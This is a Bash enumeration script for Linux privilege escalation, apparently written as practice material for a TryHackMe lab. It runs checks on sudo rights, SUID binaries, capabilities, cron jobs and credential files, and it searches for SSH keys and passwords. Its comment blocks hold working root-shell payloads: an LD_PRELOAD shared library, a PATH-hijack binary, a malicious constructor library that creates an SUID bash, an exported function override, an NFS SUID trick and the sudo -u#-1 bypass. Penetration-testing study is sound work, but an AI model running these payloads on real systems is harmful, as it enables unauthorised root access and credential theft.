#!/bin/bash
# A script to enumerate Linux systems for privilege escalation vectors; no color coding; there are C and Bash examples at the bottom
# Practice these techniques on the following THM Box: Linux Priv Esc Playground
: <<'END_COMMENT'
Other helpful tools to use in conjunction with this script:
    - https://gtfobins.github.io/
    - https://wiki.zacheller.dev/pentest/privilege-escalation/spawning-a-tty-shell
    - https://github.com/lucyoa/kernel-exploits
END_COMMENT
: <<'END_COMMENT'
Checklists:
    - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
    - https://book.hacktricks.xyz/linux-hardening/privilege-escalation
END_COMMENT
: <<'END_COMMENT'
General overview for each option (in the general order of the commands list):
    - kernel exploits
    - secrets in files/history
    - cat /etc/passwd be modified or /etc/shadow be modified/read?
    - are there SSH private keys that can be read?
    - sudo permissions: binaries we can run as root? can we use LD_PRELOAD to export a shared library as root?
        - user  (ALL, !root) /bin/bash          --> sudo -u#-1 /bin/bash
    - can SUID binaries be abused?
        - check GTFOBins for all
        - identify SUID binaries that rely on missing shared libraries with: strace <SUID binary> 2>&1 | grep -i -E "open|access|no such file"
        - use "strings <SUID binary>" to identify SUID binaries that have hardcoded commands/hardcoded relative paths
    - are there binaries with Capabilities that can be abused?
        - check GTFOBins for all with "ep" Capabilities
    - Are there scheduled tasks being run as root?
        - check the PATH according to which scheduled tasks run
        - check if the path of the binary itself or any argument in the job is writable
        - check if wildcards are used in scheduled jobs; files can be named as command switches that will but put into the job command
    - Are there mountable directories on the victim?
        - You must operate as the root user on the attacking machine
        - mount the remote directory to the attacker; create a binary that sets gid and uid to 0 and spawns a bash shell; chmod +s that binary; go to the remote machine and execute the binary
    - Do we have group memberships that can be abused (like docker, lxd, and more)?
    - are there processes running as root with command line arguments that can be injected?
    - is there any useful information in the environment variables?
END_COMMENT
: <<'END_COMMENT'
General overview for each option in the "still looking" list:
    - monitor the processes running as root in real time
    - identify services bound to 127.0.0.1 and see if they can be proxied out
    - run the automated tools
    - verify there are no mountable directories on the victim
    - list the systemd timers (another form of scheduled task)
    - look for secrets in files system wide
    - look for anything to do with passwords system wide
END_COMMENT

commands=(					# this is a list of your standard initial checks
    "id"
    "uname -a"                         # lscpu, cat /proc/version, cat /etc/version
    "find / -name '*.bak' 2>/dev/null"
    "find / -name '*.asc' 2>/dev/null"
    "find / -name *.pgp 2>/dev/null"
    "find / -name *.gpg 2>/dev/null"
    "find / -name *.old 2>/dev/null"
    "history"
    "find / -name bash_history 2>/dev/null"
    "ls -al /etc/shadow"
    "ls -al /etc/passwd"                # cat /etc/passwd | cut -d : -f 1
    "find / -name id_* 2>/dev/null"     # chmod 600 id_*, chmod 700 authorized_keys, ssh -i id_* vic@tim
    "sudo -l"                           # sudo su -, 
    "sudo --version"
    "find / -perm -u=s -type f 2>/dev/null"         # strace <SUID binary> 2>&1 | grep -i -E "open|access|no such file"
    "find / -type f -perm -04000 -ls 2>/dev/null"   # strings <SUID binary> --> identify hardcoded commands and relative paths
    "getcap -r / 2>/dev/null"
    "cat /etc/crontab"
    "crontab -l"
    "cat /etc/export"   # (as local root): mkdir /mnt/point; sudo mount -o rw,vers=3 10.10.135.254:/tmp /mnt/point; create and execute an SUID binary on the victim to spawn a bash shell
    "groups"                            # docker, lxd
    "ps aux | grep root"                # dpkg -l <package> 
    "env"
)

stillLookingCommands=(			# these are for digging a little deeper
	"pspy64"
	"netstat -antp"
	"linenum.sh, linuxprivchecker.py, linux-exploit-suggester.sh"
	"showmount -e <victimIP>"
	"systemctl list-timers all"
	"locate password | more"
	'grep --color=auto -rnw "/" -ie "PASSWORD" --color=always 2> /dev/null'
)

for cmd in "${commands[@]}"; do				# this is the main loop that executes all commands in the "commands" list
	printf "\n"
	echo "Executing: $cmd"
	printf "\n"
	eval $cmd
	printf "\n"
	read -p "Press enter to continue..."		# this is the line that pauses execution
done

printf "\nIf you are still looking, consider the following options:\n"		# letting the user know about their other options
for item in "${stillLookingCommands[@]}"; do
	echo "$item"
done

: <<'END_COMMENT'
C Code examples:

1. Abusing LD_PRELOAD:
/*
 * the executable used in the command has to be sudoable
 */
// gcc -fPIC -shared -o shell.so shell.c -nostartfiles
// sudo LD_PRELOAD=/home/user/shell.so <executable>
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>

void _init() {
        unsetenv("LD_PRELOAD");
        setgid(0);
        setuid(0);
        system("/bin/bash");
}

2. Replacing a hardcoded command in an SUID binary:

// gcc exploit.c -o exploit
// export PATH=/$PWD:$PATH

//      You are creating a malicious executable and placing its
//      directory ahead of the legitimate service's directory via the PATH variable

int main(void) {
        setgid(0);
        setuid(0);
        system("/bin/bash");
        return 0;
}

3. Replacing a missing shared object referenced by an SUID binary:

// gcc -shared -o sharedlib.so -fPIC sharedlib.c
// This malicious library replaces a missing shared library relied upon by an SUID binary

#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
        system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
 
Bash examples:
    1. cp /bin/bash /tmp/bash; chmod +s /tmp/bash
    2. Exporting a malicious function to replace a hard coded relative path:

        # 1. Declare the function at the command line
        # 2. Make the current directory first on PATH just to be safe
        # 3. export -f /function/path/name
        # 4. execute the SUID binary that calls the malicious function

        function /usr/sbin/service() { cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p; }
END_COMMENT
